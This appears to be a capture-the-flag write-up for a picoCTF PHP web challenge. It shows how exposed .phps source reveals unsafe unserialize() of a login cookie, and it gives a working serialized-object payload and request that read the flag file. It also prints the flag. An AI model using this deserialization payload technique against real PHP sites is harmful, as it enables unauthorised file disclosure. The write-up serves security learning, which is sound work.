# Solution

Website uses PHP. There are 2 main indicators.

```
1. From the Cookie PHPSESSID: 

2. From submitting the form, we get redirected to /index.php
```

Let's check the robots.txt file.

```
User-agent: *
Disallow: /admin.phps
```

Normally `php` files are interpreted and the source code is not found in the page. But a `phps` file contains the color-formatted content of the script, and will be shown in the html served.

So try requesting `/index.phps`.

```php
// index.phps
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

PHP code is visible (Output is truncated to only include code). Let's do the same for `cookie.phps` and `authentication.phps`.

```php
// cookie.phps
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

In `cookie.phps`, is_guest and is_admin checks user credentials in an SQLite database. And the strings are first sanitized before creating the query. Hence there are no SQL injections here.

But an interesting find is this

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

If `login` is present in the HTTP cookie, we are unserialize it's contents and expect it to be a valid permissions object. This is a red flag, as we can affect how the code runs if we provide a malformed `login` value.

As there's nothing more we can do without further info, let's continue by looking at `authentication.phps` next.

```php
// authentication.phps
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

`$access_log->__toString()` is an object that will read contents from a file and return it. We can use this method to read contents from `../flag`.

Remember the deserialization part in `cookie.phps`? We can abuse the fact that php calls the `__toString()` method of an object when an error occurs to print the results in our flag.

To do that, we need to do the opposite of the code below.
```php
unserialize(base64_decode(urldecode($_COOKIE["login"])));
```

Serialized value can be computed below
```php
$val = urlencode(base64_encode(serialize(new access_log("../flag"))));
echo($val);     // TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

Let's call `authentication.phps` with our login cookie.

```
GET http://mercury.picoctf.net:2148/authentication.phps

Host: mercury.picoctf.net:2148
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

Nothing noteworthy happens. This is because `phps` file only shows the formatted php code but does not execute it.

We need to send this to `authentication.php`. And our flag is shown below.

```
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}
```